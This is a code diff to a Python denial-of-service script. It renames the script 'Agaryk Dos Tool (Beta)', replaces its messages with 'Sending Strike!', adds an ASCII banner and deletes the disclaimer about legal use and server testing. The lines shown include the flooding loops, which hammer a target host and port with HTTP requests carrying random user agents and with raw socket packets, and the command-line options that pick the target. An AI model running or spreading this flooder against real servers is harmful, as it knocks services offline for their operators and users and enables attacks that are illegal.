@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-# HAmmer
+# Agaryk Dos Tool (Beta)
 
 
 from queue import Queue
@@ -33,7 +33,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mHitting...\033[0m")
+			print("\033[94mSending Strike!\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -47,7 +47,7 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Hitting...--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Sending Strike!--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
@@ -74,13 +74,19 @@ def dos2():
 
 def usage():
 	print (''' \033[92m	
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
+	                                                                             
+   _|_|                                      _|_|_|                          
+ _|    _|     _|_|_|     _|_|_|   _|  _|_|   _|    _|     _|_|       _|_|_|  
+ _|_|_|_|   _|    _|   _|    _|   _|_|       _|    _|   _|    _|   _|_|      
+ _|    _|   _|    _|   _|    _|   _|         _|    _|   _|    _|       _|_|  
+ _|    _|     _|_|_|     _|_|_|   _|         _|_|_|       _|_|     _|_|_|    
+                  _|                                                         
+              _|_|                                                           
 	usage : python3 agardos.py [-s] [-p] [-t]
 	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
+	-s : IP
+	-p : port
+	-t : turbo \033[0m''')
 	sys.exit()
 
 
